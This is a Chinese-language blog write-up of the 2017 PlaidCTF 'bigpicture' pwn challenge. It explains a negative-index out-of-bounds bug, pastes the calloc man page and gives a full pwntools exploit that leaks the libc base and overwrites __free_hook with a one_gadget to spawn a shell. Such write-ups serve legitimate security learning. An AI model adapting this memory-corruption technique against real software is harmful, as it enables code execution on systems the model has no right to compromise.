---
title: 2017PlaidCTF bigpicture
tags:
  - PWN
categories: []
date: 2017-04-26 18:43:50
---

## bigpicture

我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。

给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。

明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。

推荐一个工具**[one_gadget](https://github.com/david942j/one_gadget)**，正如作者所说
> This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.

嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。

用到了一个`calloc`函数，第一次是在0CTF中遇到，和`malloc`功能相同，但是会把分配得到的内存清`0`。
学到一个快速查看函数的方法，如：`man calloc`
```
MALLOC(3)                                                                                 Linux Programmer's Manual                                                                                 MALLOC(3)

NAME
       malloc, free, calloc, realloc - allocate and free dynamic memory

SYNOPSIS
       #include <stdlib.h>

       void *malloc(size_t size);
       void free(void *ptr);
       void *calloc(size_t nmemb, size_t size);
       void *realloc(void *ptr, size_t size);

DESCRIPTION
       The  malloc() function allocates size bytes and returns a pointer to the allocated memory.  The memory is not initialized.  If size is 0, then malloc() returns either NULL, or a unique pointer value
       that can later be successfully passed to free().

       The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc(), calloc(), or realloc().  Otherwise,  or  if  free(ptr)  has  already  been
       called before, undefined behavior occurs.  If ptr is NULL, no operation is performed.

       The  calloc() function allocates memory for an array of nmemb elements of size bytes each and returns a pointer to the allocated memory.  The memory is set to zero.  If nmemb or size is 0, then cal‐
       loc() returns either NULL, or a unique pointer value that can later be successfully passed to free().

       The realloc() function changes the size of the memory block pointed to by ptr to size bytes.  The contents will be unchanged in the range from the start of the region up to the minimum  of  the  old
       and  new  sizes.  If the new size is larger than the old size, the added memory will not be initialized.  If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; if size
       is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr).  Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc() or realloc().  If  the  area
       pointed to was moved, a free(ptr) is done.

RETURN VALUE
       The malloc() and calloc() functions return a pointer to the allocated memory, which is suitably aligned for any built-in type.  On error, these functions return NULL.  NULL may also be returned by a
       successful call to malloc() with a size of zero, or by a successful call to calloc() with nmemb or size equal to zero.

       The free() function returns no value.

       The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any built-in type and may be different from ptr, or NULL if the  request  fails.   If  size  was
       equal to 0, either NULL or a pointer suitable to be passed to free() is returned.  If realloc() fails, the original block is left untouched; it is not freed or moved.

ERRORS
       calloc(), malloc(), and realloc() can fail with the following error:

       ENOMEM Out of memory.  Possibly, the application hit the RLIMIT_AS or RLIMIT_DATA limit described in getrlimit(2).

ATTRIBUTES
       For an explanation of the terms used in this section, see attributes(7).

       ┌─────────────────────┬───────────────┬─────────┐
       │Interface            │ Attribute     │ Value   │
       ├─────────────────────┼───────────────┼─────────┤
       │malloc(), free(),    │ Thread safety │ MT-Safe │
       │calloc(), realloc()  │               │         │
       └─────────────────────┴───────────────┴─────────┘
...
...
...
```

思路：
1. 利用任意地址读泄露libc基址
2. 将`__free_hook`修改为`one_gadget`

exp：
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 0
local = 1
debug = 0

global p

if slog: context(log_level = 'debug')
if local:
    p = process('./bigpicture')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))

offset = 0x109000 + 16

def edit(address, data):
    t = 0
    address -= 0x398000
    for i in range(offset - (address - libc.address), offset - (address - libc.address) - 8, -1):
        k = -i
        p.recvuntil('>')
        p.sendline('0, {}, {}'.format(k, data[t]))
        t += 1

def pwn():
    p.recvuntil('big?')
    p.sendline('1000 x 1000')
    leak_realloc = ''       # _dl_runtime_resolve_avx_slow
#    gdb.attach(p)
    for i in range(0x109000 - 24, 0x109000 - 30, -1):
        k = -i
        p.recvuntil('>')
        p.sendline('0, {}, r'.format(k))
        p.recvuntil('overwriting ')
        leak_realloc = p.recv(1) + leak_realloc
    print leak_realloc.encode('hex')
    leak_realloc = int(leak_realloc.encode('hex'), 16)
    libc.address = leak_realloc - libc.plt['realloc'] - 6 - 0x10
    print 'libc.address => ', hex(libc.address)
    __free_hook_addr = libc.symbols['__free_hook']
    print '__free_hook => ', hex(libc.symbols['__free_hook'])
    one_gadget = libc.address + 0x3f33a
    print 'one_gadget => ', hex(one_gadget)
    edit(__free_hook_addr, p64(one_gadget))
#    gdb.attach(p)
    p.sendline('quit')

if __name__ == '__main__':
    pwn()
    p.interactive()
```